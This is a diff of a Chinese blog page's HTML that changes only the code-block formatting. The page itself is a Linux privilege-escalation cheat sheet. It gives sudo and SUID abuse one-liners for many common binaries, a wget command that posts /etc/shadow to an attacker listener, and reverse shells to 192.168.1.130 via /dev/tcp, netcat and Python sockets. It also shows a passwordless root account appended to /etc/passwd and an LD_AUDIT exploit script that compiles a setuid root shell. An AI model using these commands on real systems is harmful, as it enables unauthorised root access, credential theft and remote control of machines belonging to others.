-<pre class="line-numbers language-shell"><code class="language-shell">find /etc/passwd -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.130",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-ip"]);' \;
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.130",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-ip"]);' \;</span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="03-zip提权-核心sudo没有该命令-失效"><a href="#03-zip提权-核心sudo没有该命令-失效" class="headerlink" title="03.zip提权( 核心sudo没有该命令,失效  )"></a>03.zip提权( 核心<strong>sudo</strong>没有该命令,失效  )</h3><p>zip 命令用于压缩文件，是个 使用广泛的压缩程序，压缩后的文件后缀名为 .zip。通过压缩一个存在的文件，并调用-T参数输出shell</p>
 <p>\1. 下载zip（如果没有）<strong>apt install zip</strong></p>
 <p>\2. 创建一个1.txt，将其压缩为1.zip</p>
 <p>\3. 执行</p>
-<pre class="line-numbers language-shell"><code class="language-shell">touch 1.txt
-sudo zip 1.zip 1.txt -T --unzip-command="sh -c /bin/bash"
-或
-touch 1.txt
-sudo -u root zip 1.zip 1.txt -T -unzip-command="sh -c /bin/bash"
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="04-awk-x2F-morpheus提权"><a href="#04-awk-x2F-morpheus提权" class="headerlink" title="04.awk/morpheus提权"></a>04.awk/morpheus提权</h3><pre class="line-numbers language-shell"><code class="language-shell"> sudo awk 'BEGIN {system("/bin/sh")}'
-sudo morpheus 'BEGIN {system("/bin/sh")}'
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="05-less-x2F-more-提权"><a href="#05-less-x2F-more-提权" class="headerlink" title="05.less**/more**提权"></a>05.less**/more**提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo less /etc/hosts
-!bash
-//若已被分配root权限
-less /etc/passwd
-!/bin/sh
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="06-man提权"><a href="#06-man提权" class="headerlink" title="06.man提权"></a>06.man提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo man man
-!bash
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="07-env提权"><a href="#07-env提权" class="headerlink" title="07.env提权"></a>07.env提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo env /bin/bash
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="08-ed提权"><a href="#08-ed提权" class="headerlink" title="08.ed提权"></a>08.ed提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo ed
-!/bin/bash
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="09-apt提权"><a href="#09-apt提权" class="headerlink" title="09.apt提权"></a>09.apt提权</h3><pre class="line-numbers language-shell"><code class="language-shell">TF=$(mktemp)
-echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
-sudo apt-get install -c $TF sl
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch 1.txt</span><br><span class="line">sudo zip 1.zip 1.txt -T --unzip-command="sh -c /bin/bash"</span><br><span class="line">或</span><br><span class="line">touch 1.txt</span><br><span class="line">sudo -u root zip 1.zip 1.txt -T -unzip-command="sh -c /bin/bash"</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="04-awk-x2F-morpheus提权"><a href="#04-awk-x2F-morpheus提权" class="headerlink" title="04.awk/morpheus提权"></a>04.awk/morpheus提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> sudo awk 'BEGIN {system("/bin/sh")}'</span><br><span class="line">sudo morpheus 'BEGIN {system("/bin/sh")}'</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="05-less-x2F-more-提权"><a href="#05-less-x2F-more-提权" class="headerlink" title="05.less**/more**提权"></a>05.less**/more**提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">!bash</span><br><span class="line">//若已被分配root权限</span><br><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="06-man提权"><a href="#06-man提权" class="headerlink" title="06.man提权"></a>06.man提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!bash</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="07-env提权"><a href="#07-env提权" class="headerlink" title="07.env提权"></a>07.env提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo env /bin/bash</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="08-ed提权"><a href="#08-ed提权" class="headerlink" title="08.ed提权"></a>08.ed提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ed</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="09-apt提权"><a href="#09-apt提权" class="headerlink" title="09.apt提权"></a>09.apt提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' &gt; $TF</span><br><span class="line">sudo apt-get install -c $TF sl</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455401.png" alt="img"></p>
-<h3 id="10-pip提权"><a href="#10-pip提权" class="headerlink" title="10.pip提权"></a>10.pip提权</h3><pre class="line-numbers language-shell"><code class="language-shell">TF=$(mktemp -d)
-echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
-sudo pip install $TF
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3 id="11-sed提权"><a href="#11-sed提权" class="headerlink" title="11.sed提权"></a>11.sed提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo sed -n '1e exec sh 1>&0' /etc/passwd
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="12-tmux提权"><a href="#12-tmux提权" class="headerlink" title="12.tmux提权"></a>12.tmux提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo tmux 
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="10-pip提权"><a href="#10-pip提权" class="headerlink" title="10.pip提权"></a>10.pip提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')" &gt; $TF/setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="11-sed提权"><a href="#11-sed提权" class="headerlink" title="11.sed提权"></a>11.sed提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -n '1e exec sh 1&gt;&amp;0' /etc/passwd</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="12-tmux提权"><a href="#12-tmux提权" class="headerlink" title="12.tmux提权"></a>12.tmux提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tmux </span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="13-nmap提权"><a href="#13-nmap提权" class="headerlink" title="13.nmap提权"></a>13.<strong>nmap</strong>提权</h3><p> 版本5.0一下<br>*<em>进入nmap交互模式</em> *  </p>
-<pre class="line-numbers language-shell"><code class="language-shell">sudo nmap --interactive
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="14-taskset提权"><a href="#14-taskset提权" class="headerlink" title="14.taskset提权"></a>14.taskset提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo taskset 1 /bin/sh -p
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="15-scp提权"><a href="#15-scp提权" class="headerlink" title="15.scp提权"></a>15.scp提权</h3><pre class="line-numbers language-shell"><code class="language-shell">TF=$(mktemp)
-echo 'sh 0<&2 1>&2' > $TF
-chmod +x "$TF"
-sudo scp -S $TF x y:
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="16-ftp提权"><a href="#16-ftp提权" class="headerlink" title="16.ftp提权"></a>16.ftp提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo ftp 
-!/bin/bash
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="17-perl提权"><a href="#17-perl提权" class="headerlink" title="17.perl提权"></a>17.perl提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo perl -e 'exec "/bin/bash";'
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="0x06-不需要sudo执行权限的提权方式"><a href="#0x06-不需要sudo执行权限的提权方式" class="headerlink" title="0x06.不需要sudo执行权限的提权方式"></a>0x06.不需要sudo执行权限的提权方式</h2><h3 id="01-wget提权-可能也需要sudo"><a href="#01-wget提权-可能也需要sudo" class="headerlink" title="01.wget提权(可能也需要sudo)"></a>01.wget提权(可能也需要sudo)</h3><pre class="line-numbers language-shell"><code class="language-shell">##kali上监听
-nc -lvp 4444 > hash.txt 
-##靶机上
-/usr/bin/wget --post-file=/etc/shadow 192.168.1.130:4444
-sudo /usr/bin/wget --post-file=/etc/shadow 192.168.1.130:4444
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --interactive</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="14-taskset提权"><a href="#14-taskset提权" class="headerlink" title="14.taskset提权"></a>14.taskset提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo taskset 1 /bin/sh -p</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="15-scp提权"><a href="#15-scp提权" class="headerlink" title="15.scp提权"></a>15.scp提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo 'sh 0&lt;&amp;2 1&gt;&amp;2' &gt; $TF</span><br><span class="line">chmod +x "$TF"</span><br><span class="line">sudo scp -S $TF x y:</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="16-ftp提权"><a href="#16-ftp提权" class="headerlink" title="16.ftp提权"></a>16.ftp提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ftp </span><br><span class="line">!/bin/bash</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="17-perl提权"><a href="#17-perl提权" class="headerlink" title="17.perl提权"></a>17.perl提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e 'exec "/bin/bash";'</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="0x06-不需要sudo执行权限的提权方式"><a href="#0x06-不需要sudo执行权限的提权方式" class="headerlink" title="0x06.不需要sudo执行权限的提权方式"></a>0x06.不需要sudo执行权限的提权方式</h2><h3 id="01-wget提权-可能也需要sudo"><a href="#01-wget提权-可能也需要sudo" class="headerlink" title="01.wget提权(可能也需要sudo)"></a>01.wget提权(可能也需要sudo)</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#kali上监听</span></span></span><br><span class="line">nc -lvp 4444 &gt; hash.txt </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#靶机上</span></span></span><br><span class="line">/usr/bin/wget --post-file=/etc/shadow 192.168.1.130:4444</span><br><span class="line">sudo /usr/bin/wget --post-file=/etc/shadow 192.168.1.130:4444</span><br></pre></td></tr></tbody></table></figure>
+
 <p>此时，kali上拿到了hash.txt</p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455873.png" alt="img"></p>
 <h3 id="02-Ubuntu计划任务提权-配合suid提权"><a href="#02-Ubuntu计划任务提权-配合suid提权" class="headerlink" title="02.Ubuntu计划任务提权(配合suid提权)"></a>02.Ubuntu计划任务提权(配合suid提权)</h3><p>对于可能存在的权限配置不当的有root权限的计划任务，让我们普通用户也拥有修改的权限，我们修改其中的内容，为bash、less等赋予SUID权限，与SUID提权结合，使其提权成功！</p>
 <p>列出系统中的一些计划任务：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">ls -l /etc/cron*
-cat /etc/crontab
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br><span class="line">cat /etc/crontab</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455430.png" alt="img"></p>
 <p>crontab -l查看当前用户命令</p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455138.png" alt="img"></p>
@@ -323,70 +204,32 @@ cat /etc/crontab
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455195.png" alt="img"></p>
 <p>如果遇到了权限为777配置不当的计划任务，我们可以修改时，我们可以往文件里面添加内容。</p>
 <p>比如把shell复制到tmp目录下其次给权限</p>
-<pre class="line-numbers language-plain"><code class="language-plain">cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;</span><br></pre></td></tr></tbody></table></figure>
+
 <p>或者给其他组件权限也可以进行提权，比如find、vim、less之类的，具体方法上面有写。</p>
 <h3 id="03-teehee提权"><a href="#03-teehee提权" class="headerlink" title="03. teehee提权"></a>03. teehee提权</h3><p> teehee提权是使用teehee -a 把一个账号密码写入到etc/passwd中，这个用户具有root权限，再切换到这个用户即可  </p>
-<pre class="line-numbers language-shell"><code class="language-shell">echo "light::0:0:::/bin/bash" | sudo teehee -a /etc/passwd    //提权语句
-su light
-cat /root/flag.txt
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo "light::0:0:::/bin/bash" | sudo teehee -a /etc/passwd    //提权语句</span><br><span class="line">su light</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="04-脚本ping提权"><a href="#04-脚本ping提权" class="headerlink" title="04.脚本ping提权"></a>04.脚本<strong>ping</strong>提权</h3><p> 核心<strong>ping</strong>和<strong>gcc</strong>没有则无法实现  </p>
-<pre class="line-numbers language-shell"><code class="language-shell">vi 2.sh
-unset LD_AUDIT
-rm -r -f /tmp/exploit
-mkdir /tmp/exploit
-ln /bin/ping /tmp/exploit/target
-exec 3< /tmp/exploit/target
-ls -l /proc/$$/fd/3
-rm -rf /tmp/exploit
-ls -l /proc/$$/fd/3
-cat > program.c << _EOF
-void __attribute__((constructor)) init()
-{
-    setuid(0);
-    system("/bin/bash");
-}
-_EOF
-gcc -w -fPIC -shared -o /tmp/exploit program.c
-LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
-unset LD_AUDIT
-chmod 777 2.sh
-./2.sh
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vi 2.sh</span><br><span class="line">unset LD_AUDIT</span><br><span class="line">rm -r -f /tmp/exploit</span><br><span class="line">mkdir /tmp/exploit</span><br><span class="line">ln /bin/ping /tmp/exploit/target</span><br><span class="line">exec 3&lt; /tmp/exploit/target</span><br><span class="line">ls -l /proc/$$/fd/3</span><br><span class="line">rm -rf /tmp/exploit</span><br><span class="line">ls -l /proc/$$/fd/3</span><br><span class="line">cat &gt; program.c &lt;&lt; _EOF</span><br><span class="line">void __attribute__((constructor)) init()</span><br><span class="line">{</span><br><span class="line">    setuid(0);</span><br><span class="line">    system("/bin/bash");</span><br><span class="line">}</span><br><span class="line">_EOF</span><br><span class="line">gcc -w -fPIC -shared -o /tmp/exploit program.c</span><br><span class="line">LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3</span><br><span class="line">unset LD_AUDIT</span><br><span class="line">chmod 777 2.sh</span><br><span class="line">./2.sh</span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="05-寻找高权限用户提权"><a href="#05-寻找高权限用户提权" class="headerlink" title="05 寻找高权限用户提权"></a>05 寻找高权限用户提权</h3><p>拿到shell后进入开始寻找</p>
-<pre class="line-numbers language-shell"><code class="language-shell">cat /etc/passwd   （查看是否存在高权限用户）
-cd /home （进入高级用户目录查看文件）
-(进入其他用户目录，查看文件寻找密码，一般来说都可以通过历史History，wordpass)
-然后登录sudo 用户名
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd   （查看是否存在高权限用户）</span><br><span class="line">cd /home （进入高级用户目录查看文件）</span><br><span class="line">(进入其他用户目录，查看文件寻找密码，一般来说都可以通过历史History，wordpass)</span><br><span class="line">然后登录sudo 用户名</span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="06-screen提权"><a href="#06-screen提权" class="headerlink" title="06 screen提权"></a>06 screen提权</h3><p>步骤和其他服务（exim4，apache，linux内核…）查询一样的都是searchsploit加服务然后上传运行</p>
-<pre class="line-numbers language-plain"><code class="language-plain">searchsploit screen 版本号 
-cat *.sh 一般来说这些sh文件都要拆分出来用，会吧会拆分吧{} 
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 版本号 </span><br><span class="line">cat *.sh 一般来说这些sh文件都要拆分出来用，会吧会拆分吧{} </span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="07-SUID提权"><a href="#07-SUID提权" class="headerlink" title="07 SUID提权"></a>07 SUID提权</h3><p> <strong>注意：suid提权是短暂的，能帮我们以root权限执行指定的命令</strong>  </p>
 <p><strong>1）什么是SUID</strong></p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455858.png" alt="img"></p>
 <p>SUID是一种对二进制程序进行设置的特殊权限,可以让二进制程序的执行者临时拥有属主的权限</p>
 <p>当s这个标志出现在文件所有者的x权限上时，如/usr/bin/passwd这个文件的权限状态：“-rwsr-xr-x”，此时就被称为Set UID，简称为SUID。那么这个特殊权限的特殊性的作用是什么呢？</p>
-<pre class="line-numbers language-plain"><code class="language-plain">1、SUID权限仅对二进制程序(binary program)有效；
-2、执行者对于该程序需要具有x的可执行权限；
-3、本权限仅在执行该程序的过程中有效(run-time)；
-4、执行者将具有该程序拥有者(owner)的权限。
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、SUID权限仅对二进制程序(binary program)有效；</span><br><span class="line">2、执行者对于该程序需要具有x的可执行权限；</span><br><span class="line">3、本权限仅在执行该程序的过程中有效(run-time)；</span><br><span class="line">4、执行者将具有该程序拥有者(owner)的权限。</span><br></pre></td></tr></tbody></table></figure>
+
 <p>SUID的目的就是：<strong>让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。</strong></p>
 <p><strong>2）用此命令即可 找到具有 SUID 权限的参数：</strong></p>
-<pre class="line-numbers language-plain"><code class="language-plain">find / -perm -u=s -type f 2>/dev/null
-find / -user root -perm -4000-print2>/dev/null
-find / -user root -perm -4000-exec ls -ldb {} \;
-三选一
-/表示从文件系统的顶部（根）开始并找到每个目录
--perm 表示搜索随后的权限
--u = s表示查找root用户拥有的文件
--type表示我们正在寻找的文件类型
-f 表示常规文件，而不是目录或特殊文件
-2表示该进程的第二个文件描述符，即stderr（标准错误）
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb {} \;</span><br><span class="line">三选一</span><br><span class="line">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line">-perm 表示搜索随后的权限</span><br><span class="line">-u = s表示查找root用户拥有的文件</span><br><span class="line">-type表示我们正在寻找的文件类型</span><br><span class="line">f 表示常规文件，而不是目录或特殊文件</span><br><span class="line">2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br></pre></td></tr></tbody></table></figure>
+
 <p>会查找到很多。常见suid提权文件有：</p>
 <p><strong>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</strong></p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455826.png" alt="img"> 在后面，看到 find 也具有 SUID权限。 （因此这里以find为例）  那么我们就可以进行进一步提权了。  </p>
@@ -394,80 +237,25 @@ f 表示常规文件，而不是目录或特殊文件
 <p>2.输入whoami 可以看到我们还是普通用户 ，那么我们使用具有SUID权限的find 命令  是否能够成功提权呢？</p>
 <p>3.我们需要先创建文件，因为find 命令 需要一个指向性的查找。  </p>
 <p>4.执行命令提权：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">find test.txt -exec whoami \;
-find /home -exec /bin/bash \;
-python -c 'import pty;pty.spawn("/bin/bash")' 生成交互式终端
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find test.txt -exec whoami \;</span><br><span class="line">find /home -exec /bin/bash \;</span><br><span class="line">python -c 'import pty;pty.spawn("/bin/bash")' 生成交互式终端</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>用find进行反弹shell</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.1.130/2333 0>&1 \;
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec bash -ip &gt;&amp; /dev/tcp/192.168.1.130/2333 0&gt;&amp;1 \;</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>利用find+nc反弹shell</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \;
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \;</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>find+python进行反弹shell</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">find /etc/passwd -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.130",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-ip"]);' \;
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h5 id="其他利用方式："><a href="#其他利用方式：" class="headerlink" title="其他利用方式："></a>其他利用方式：</h5><pre class="line-numbers language-shell"><code class="language-shell">find命令
-sudo find . -exec /bin/sh \; -quit　
-进行反弹shell也可以
-find dirty -exec nc -lvp 9999 -e /bin/sh ;
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.130",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-ip"]);' \;</span><br></pre></td></tr></tbody></table></figure>
 
-chmod命令
-sudo sh -c 'cp $(which chmod) .; chmod +s ./chmod
-ash，linux shell
-sudo ash
+<h5 id="其他利用方式："><a href="#其他利用方式：" class="headerlink" title="其他利用方式："></a>其他利用方式：</h5><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find命令</span><br><span class="line">sudo find . -exec /bin/sh \; -quit　</span><br><span class="line">进行反弹shell也可以</span><br><span class="line">find dirty -exec nc -lvp 9999 -e /bin/sh ;</span><br><span class="line"></span><br><span class="line">chmod命令</span><br><span class="line">sudo sh -c 'cp $(which chmod) .; chmod +s ./chmod</span><br><span class="line">ash，linux shell</span><br><span class="line">sudo ash</span><br><span class="line"></span><br><span class="line">cp命令</span><br><span class="line">sudo sh -c 'cp $(which cp) .; chmod +s ./cp　</span><br><span class="line"></span><br><span class="line">gdb命令</span><br><span class="line">gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit</span><br></pre></td></tr></tbody></table></figure>
 
-cp命令
-sudo sh -c 'cp $(which cp) .; chmod +s ./cp　
-
-gdb命令
-gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
